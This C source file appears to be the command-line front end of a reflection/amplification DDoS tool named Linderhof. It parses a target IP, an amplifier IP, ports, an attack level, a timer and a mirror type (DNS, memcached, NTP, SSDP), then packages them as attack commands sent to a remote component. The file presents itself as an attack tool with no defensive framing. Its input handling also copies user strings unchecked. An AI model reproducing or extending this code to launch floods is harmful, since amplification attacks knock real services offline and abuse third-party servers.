#include "venus.h"
#include "common/cliparser.h"
#include "interface/interface.h"
#include "monitor/crake.h"
#include "netuno/netuno.h"

#define UNKNOWCMD -1
#define ERRORIP -2

#define DEFAULT_TIMER 0
#define DEFAULT_TARGETPORT 80

#define ARG_HELP 'h'
#define ARG_MIRROR 'm'
#define ARG_TARGETIP 't'
#define ARG_AMPLIFIERIP 'a'
#define ARG_AMPPORT 'p'
#define ARG_TARGPORT 'g'
#define ARG_LEVEL 'l'
#define ARG_TIMER 'c'
#define ARG_LOGFILE 'f'
#define ARG_INCREMENT 'i'

static ArgsOpt atkArgpOption[] =
{
    { ARG_HELP, "help", false, false, "Show usage"},
    { ARG_MIRROR, "mirror", true, true, "Mirror type"},
    { ARG_TARGETIP, "target", true, true, "Target IPV4"},
    { ARG_AMPLIFIERIP, "amplifier", true, true, "Amplifier IPV4"},
    { ARG_AMPPORT , "amport", true, false, "Amplifier port"},
    { ARG_TARGPORT, "targport", true, false, "Target port"},
    { ARG_LEVEL, "level", true, false, "Attack level"},
    { ARG_TIMER, "timer", true, false, "Attack timer"},
    { ARG_LOGFILE, "log", true, false, "Log file name"},
    { ARG_INCREMENT, "inc", true, false, "Increment attack"},
    { 0 }
};

void usage()
{
    printf("Usage: lhf [ARGS]\n\n \
                Linderhof (lhf) CLI\n\n");
            
    printf("Mandatory arguments:\n");
    for( int i = 0; i < lengthof(atkArgpOption) - 1; i++ )
    {
        if(atkArgpOption[i].bounden)
        {
            if(atkArgpOption[i].input)
            {
                printf("    -%c    --%s=INPUT   %s\n", atkArgpOption[i].args, atkArgpOption[i].argl, atkArgpOption[i].help); 
            }
            else
            {
                printf("    -%c    --%s         %s\n", atkArgpOption[i].args, atkArgpOption[i].argl, atkArgpOption[i].help);
            }
        }
    }

    printf("\nOptional arguments:\n");
    for( int i = 0; i < lengthof(atkArgpOption) -1; i++ )
    {
        if(!atkArgpOption[i].bounden)
        {
            if(atkArgpOption[i].input)
            {
                printf("    -%c    --%s=INPUT   %s\n", atkArgpOption[i].args, atkArgpOption[i].argl, atkArgpOption[i].help); 
            }
            else
            {
                printf("    -%c    --%s         %s\n", atkArgpOption[i].args, atkArgpOption[i].argl, atkArgpOption[i].help);
            }
        }
    }

    raise(SIGTERM);
}

int parserAttackOpt (char key, char *arg, ArgState *state)
{ 
    LhfDraft *draft = state->input;

    switch (key)
    {
        case ARG_HELP:
            usage();
            break;

        case ARG_MIRROR:
            if( !strcmp(arg, "test") )
            {
                draft->type = TEST;
                strcpy(draft->mirrorName, "TEST"); 
            }
            else if( !strcmp(arg, "dns") )
            {
                draft->type = DNS;
                strcpy(draft->mirrorName, "DNS");
            }
            else if( !strcmp(arg, "memcached_getset") )
            {
                draft->type = MEMCACHED_GETSET;
                strcpy(draft->mirrorName, "MEMCACHED GETSET"); 
            }
            else if( !strcmp(arg, "memcached_stat") )
            {
                draft->type = MEMCACHED_STATS;
                strcpy(draft->mirrorName, "MEMCACHED STAT");
            }
            else if( !strcmp(arg, "ntp") )
            {
                draft->type = NTP;
                strcpy(draft->mirrorName, "NTP");
            }
            else if( !strcmp(arg, "ssdp") )
            {
                draft->type = SSDP;
                strcpy(draft->mirrorName, "SSDP");
            }
            else
            {
                Efatal(ERROR_CLI, "Invalid input");
            }
            break;
        
        case ARG_TARGETIP:
            if( !is_valid_ipv4(arg) )
            {
                Efatal(ERROR_CLI, "Invalid input");
            }
            memcpy(draft->target_ip, arg, strlen(arg));   
            break;

        case ARG_AMPLIFIERIP:
            if( !is_valid_ipv4(arg) )
            {
                Efatal(ERROR_CLI, "Invalid input");
            }
            memcpy(draft->amp_ip, arg, strlen(arg));
            break;
        
        case ARG_AMPPORT:
            if( NULL == arg)
            {
                Efatal(ERROR_CLI, "Internal error: Oryx fatal");
            }
            draft->amp_port = (atoi(arg) > 0) ? atoi(arg) : 0;
            break;
        
        case ARG_TARGPORT:
            if( NULL == arg)
            {
                Efatal(ERROR_CLI, "Internal error: Oryx fatal");
            }
            draft->target_port = (atoi(arg) > 0) ? atoi(arg) : DEFAULT_TARGETPORT;
            break;

        case ARG_LEVEL:
            if( NULL == arg)
            {
                Efatal(ERROR_CLI, "Internal error: Oryx fatal");
            }
            draft->level = atoi(arg);
            break;
    
        case ARG_TIMER:
            if( NULL == arg)
            {
                Efatal(ERROR_CLI, "Internal error: Oryx fatal");
            }
            draft->timer = (atoi(arg) > 0) ? atoi(arg) : DEFAULT_TIMER;
            break;

        case ARG_LOGFILE:
            if( NULL == arg)
            {
                Efatal(ERROR_CLI, "Internal error: Oryx fatal");
            }
            memcpy(draft->logfile, arg, strlen(arg));
            break;
        
        case ARG_INCREMENT:
            if( NULL == arg)
            {
                Efatal(ERROR_CLI, "Internal error: Oryx fatal");
            }
            draft->incAttack = (atoi(arg) > 0) ? atoi(arg): 0;
            break;
  }
  return 0;
}

Packet * CreateCmdPacket( CmdType p_type, int p_argc, char **p_argv, char *p_destip )
{
    CommandPkt *cmdPkt = NULL;
    Packet *pac = CreateEmptyPacket();
    ArgsCore argsAtk = { atkArgpOption, parserAttackOpt };

    memalloc( &cmdPkt , sizeof(CommandPkt) );
    
    switch( p_type )
    {
        case ExitCmd:
              cmdPkt->type = ExitCmd;
              cmdPkt->dataSize = 0;
              break;
        case AttackCmd:
            cmdPkt->type = AttackCmd;
            cmdPkt->dataSize = sizeof(LhfDraft);
            SetDraftDefaultData(&cmdPkt->data);
            if( ParserCLI(&argsAtk, p_argc, p_argv, &cmdPkt->data) == ERROR_CLI )
            {
                Efatal(ERROR_CLI, "FATAL CLI ERROR");
            }
            break;
        default:
            memfree( &cmdPkt );
            return NULL;
    }

    pac->type = LHF;
    pac->packet_ptr = cmdPkt;

    if( NULL != p_destip)
    {
        pac->pkt_size = COMMANDPKT_HEADERSIZE + cmdPkt->dataSize;
        strcpy( pac->ip_dest,p_destip);
        pac->dest_port = DEFAULT_COMPORT;
        pac->saddr.sin_family = AF_INET;
        pac->saddr.sin_port = htons(DEFAULT_COMPORT);
        pac->saddr.sin_addr.s_addr = inet_addr(p_destip);
    }
    return pac;
}

void SetDraftDefaultData( LhfDraft *p_draft )
{   
    p_draft->type = TEST;
    p_draft->target_port = DEFAULT_TARGETPORT;
    p_draft->amp_port = 0;
    p_draft->target_port = 80;
    p_draft->level = 1;
    p_draft->timer = DEFAULT_TIMER;
    p_draft->logfile[0] = '\0';
    p_draft->mirrorName[0] = '\0';
    p_draft->incAttack = false;
}
